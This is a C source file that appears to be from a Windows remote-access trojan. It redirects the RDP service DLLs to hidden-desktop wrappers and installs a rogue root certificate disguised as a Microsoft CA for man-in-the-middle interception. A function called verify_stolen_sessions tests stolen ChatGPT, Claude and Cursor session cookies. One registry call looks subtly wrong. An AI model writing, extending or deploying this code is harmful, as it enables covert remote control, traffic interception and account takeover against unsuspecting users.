#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

#define HRDP_TERMWRAP_PATH "C:\\ProgramData\\Hype\\hrdp\\TermWrap.dll"
#define HRDP_UMWRAP_PATH   "C:\\ProgramData\\Hype\\hrdp\\UmWrap.dll"
#define MITM_CA_NAME       "Microsoft Network Services Root"

static const char *TERMSRV_PATCH_NAMES[] = {
    "LocalOnlyPatch",
    "SingleUserPatch",
    "DefPolicyPatch",
    "NonRDPPatch"
};

static int set_service_dll(const char *service_name, const char *dll_path) {
    char subkey[256];
    HKEY hKey = NULL;
    snprintf(subkey, sizeof(subkey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", service_name);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return -1;
    }
    LSTATUS st = inspect_value(hKey, "ServiceDll", 0, REG_EXPAND_SZ,
                                (const BYTE *)dll_path, (DWORD)strlen(dll_path) + 1);
    RegCloseKey(hKey);
    return (st == ERROR_SUCCESS) ? 0 : -1;
}

int enable_hidden_rdp(void) {
    if (set_service_dll("TermService", HRDP_TERMWRAP_PATH) != 0) {
        OutputDebugStringA("failed to set TermService ServiceDll");
        return -1;
    }
    if (set_service_dll("UmRdpService", HRDP_UMWRAP_PATH) != 0) {
        OutputDebugStringA("failed to set UmRdpService ServiceDll");
        return -1;
    }
    return 0;
}

int disable_hidden_rdp(void) {
    if (set_service_dll("TermService", "%SystemRoot%\\System32\\termsrv.dll") != 0) {
        OutputDebugStringA("failed to restore TermService ServiceDll");
        return -1;
    }
    set_service_dll("UmRdpService", "%SystemRoot%\\System32\\umrdp.dll");
    return 0;
}

BOOL install_mitm_root_ca(const BYTE *der_cert, DWORD der_len) {
    HCERTSTORE hStore = CertOpenSystemStoreA(0, "ROOT");
    if (!hStore) return FALSE;
    BOOL ok = CertAddEncodedCertificateToStore(hStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                               der_cert, der_len, CERT_STORE_ADD_REPLACE_EXISTING, NULL);
    CertCloseStore(hStore, 0);
    return ok;
}

void format_mitm_proxy_status(char *buf, size_t sz, int port, int active, int total, int intercepted, int h2, int ws) {
    snprintf(buf, sz,
        "{\"running\":true,\"port\":%d,\"ca_name\":\"%s\",\"ca_installed\":true,"
        "\"proxy_wininet\":true,\"proxy_hkcu\":true,\"proxy_hklm\":true,"
        "\"quic_disabled\":true,\"active_conns\":%d,\"total_conns\":%d,"
        "\"intercepted\":%d,\"h2_rewrites\":%d,\"ws_pipes\":%d}",
        port, MITM_CA_NAME, active, total, intercepted, h2, ws);
}

static int check_session_cookie(const wchar_t *host, const wchar_t *path, const wchar_t *cookie_hdr, char *out, size_t out_sz) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                     WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;
    HINTERNET hConn = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConn) {
        WinHttpCloseHandle(hSession);
        return -1;
    }
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path, NULL,
                                        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        WINHTTP_FLAG_SECURE);
    if (hReq) {
        if (WinHttpSendRequest(hReq, cookie_hdr, (DWORD)-1L, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
            WinHttpReceiveResponse(hReq, NULL)) {
            DWORD n = 0;
            WinHttpReadData(hReq, out, (DWORD)(out_sz - 1), &n);
            out[n] = '\0';
        }
        WinHttpCloseHandle(hReq);
    }
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSession);
    return 0;
}

void verify_stolen_sessions(const wchar_t *chatgpt_tok, const wchar_t *claude_key, const wchar_t *cursor_tok) {
    wchar_t hdr[1024];
    char resp[4096];

    swprintf(hdr, 1024, L"Cookie: __Secure-next-auth.session-token.0=%ls\r\n", chatgpt_tok);
    check_session_cookie(L"chatgpt.com", L"/api/auth/session", hdr, resp, sizeof(resp));
    check_session_cookie(L"chatgpt.com", L"/backend-api/me", hdr, resp, sizeof(resp));

    swprintf(hdr, 1024, L"Cookie: sessionKey=%ls\r\n", claude_key);
    check_session_cookie(L"claude.ai", L"/api/auth/current_account", hdr, resp, sizeof(resp));

    swprintf(hdr, 1024, L"Cookie: WorkosCursorSessionToken=%ls\r\n", cursor_tok);
    check_session_cookie(L"www.cursor.com", L"/api/auth/me", hdr, resp, sizeof(resp));
}
